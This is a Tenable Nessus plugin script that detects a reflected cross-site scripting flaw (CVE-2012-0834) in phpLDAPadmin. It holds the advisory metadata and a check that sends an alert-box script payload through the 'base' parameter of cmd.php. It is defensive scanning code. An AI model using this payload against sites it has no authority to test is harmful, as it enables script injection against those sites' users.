#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(58040);
  script_version("$Revision: 1.5 $");
  script_cvs_date("$Date: 2016/05/16 14:22:06 $");

  script_cve_id("CVE-2012-0834");
  script_bugtraq_id(51793);
  script_osvdb_id(78743);

  script_name(english:"phpLDAPadmin lib/QueryRender.php base Parameter XSS");
  script_summary(english:"Tries to exploit an XSS flaw in phpLDAPadmin");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server contains a PHP script that is vulnerable to a
reflected cross-site scripting attack."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of phpLDAPadmin on the remote host fails to properly
sanitize the base parameter of 'lib/QueryRender.php' script before
using it to generate dynamic HTML.

By tricking someone into clicking on a specially crafted link, an
attacker may be able exploit this to inject arbitrary HTML and script
code in a user's browser to be executed within the security context of
the affected site."
  );
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?a5a0f3cc");
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?2962f46b");
  script_set_attribute(
    attribute:"solution",
    value:
"Grab the latest copy of  'lib/QueryRender.php' from the phpLDAPadmin
GIT repository or patch the file manually."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/01/23");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/01/24");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/02/20");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:deon_george:phpldapadmin");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2012-2016 Tenable Network Security, Inc.");

  script_dependencies("phpldapadmin_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/phpLDAPadmin");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE, embedded:FALSE);

install = get_install_from_kb(appname:"phpLDAPadmin", port:port, exit_on_fail:TRUE);
dir = install['dir'] + '/';

vuln_script = 'cmd.php';
xss = "<script>alert('" + SCRIPT_NAME + "')</script>";
exploit = "cmd=query_engine&query=none&base=" + urlencode(str:xss)  + "&search=Search";

# cookies present in redirects...
clear_cookiejar();

res = test_cgi_xss(
  port: port,
  dirs: make_list(dir),
  cgi: vuln_script,
  qs: exploit,
  pass_str: '>' + xss + '<',
  ctrl_re:  'phpLDAPadmin',
  follow_redirect: 2
);

if (!res) exit(0, "The phpLDAPadmin install at "+build_url(qs:dir, port:port)+" is not affected.");
